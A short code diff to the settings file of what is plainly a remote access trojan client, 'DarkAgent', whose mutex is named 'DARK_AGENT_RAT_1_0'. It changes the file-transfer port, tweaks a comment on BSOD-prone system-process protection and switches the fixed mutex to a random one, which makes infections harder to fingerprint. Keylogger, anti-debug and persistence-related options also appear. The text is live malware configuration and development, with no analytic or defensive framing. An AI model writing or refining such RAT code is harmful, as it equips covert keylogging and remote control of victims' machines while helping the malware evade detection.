@@ -14,7 +14,7 @@ namespace DarkAgent_Client.src.Utils
 
         //FileTransfer Connection
         public static string File_ConnectIP = "127.0.0.1";
-        public static int File_ConnectPort = 1155;
+        public static int File_ConnectPort = 6133;
         public static int File_NetworkKey = 0xB65F6;
 
         /* Keylogger Settings */
@@ -22,12 +22,12 @@ namespace DarkAgent_Client.src.Utils
         public static int Keylogger_Delay = 0; //Delay in mili seconds, 1000=1second
 
         /* Process Protection */
-        public static bool SystemProcess_Protect = false; //Can cause BSOD (Blue Screen of Death)... USE WITH CAUTION
+        public static bool SystemProcess_Protect = false; //Don't use for debugging!
         public static bool SystemProcess_CheckParentProcess = false; //This is for anti-debug
 
         /* MUTEX */
         public static bool Mutex_Enable = true;
-        public static string Mutex_MUTEX = "DARK_AGENT_RAT_1_0";
+        public static string Mutex_MUTEX = ""; //leave empty to have a random MUTEX
 
         /* MessageBox at startup */
         public static bool MsgBox_Enable = false;
